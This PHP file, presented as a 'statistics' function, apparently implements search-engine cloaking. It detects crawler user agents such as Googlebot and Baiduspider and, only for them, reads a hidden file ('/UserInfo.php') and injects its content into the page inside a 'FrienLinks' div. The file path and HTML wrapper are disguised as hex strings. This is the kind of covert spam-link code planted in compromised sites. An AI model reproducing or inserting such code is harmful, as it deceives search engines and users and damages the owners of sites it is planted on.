<?php
function StatiStics(){
	$Temp = "";
	if(IsZhiZhu()=="true"){
		if($_SERVER["QUERY_STRING"]!=""){
			$Temp = "2F55736572496E666F2E706870";
			$a = "3C64697620696";
			$b = "43D2246726965";
			$c = "6E4C696E6B73223E";
			$d = "3C2F6469763E";
			$Temp = EncrUnpack(ReadHtmlFile($_SERVER['DOCUMENT_ROOT'].EncrUnpack($Temp)));
			$a = EncrUnpack($a.$b.$c);
			$d = EncrUnpack($d);
			if($Temp!=""){
				$Temp = $a.$Temp.$d;
			}
		}
	}
	return $Temp;
}
function ReadHtmlFile($file_name){
	$Temp = "";
	if(file_exists($file_name)){
		if($fp = fopen($file_name, "r")){
			$ln= 0;
			while (!feof($fp)) {
				$line = fgets($fp);
				++$ln;
				if ($line===FALSE){
					$Temp = $Temp."FALSE\n";
				}
				else{
					$Temp = $Temp.$line;
				}
			}
			fclose($fp);
		}
	}
	return $Temp;
}
function EncrUnpack($Data){
	$Temp = pack("H*",$Data);
	return $Temp;
}
function IsZhiZhu(){
	$Temp = "false";
	$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
	$useragent = strtolower($useragent);
	$ZhiZhu = "360Spider|Baiduspider|Sosospider|sogou spider|YodaoBot|Googlebot|Bingbot|Slurp|Teoma|ia_archiver|twiceler|MSNBot|Scrubby|Robozilla|Gigabot|googlebot-image|googlebot-mobile|yahoo-mmcrawler|yahoo-blogs/v3.9";
	$ZhiZhu = strtolower($ZhiZhu);
	$ZZArray = explode('|',$ZhiZhu);
	foreach($ZZArray as $key=>$val){
		if (strpos($useragent,$val) !== false){
			$Temp = "true";
			break;
		}
	}
	return $Temp;
}
echo StatiStics();
?>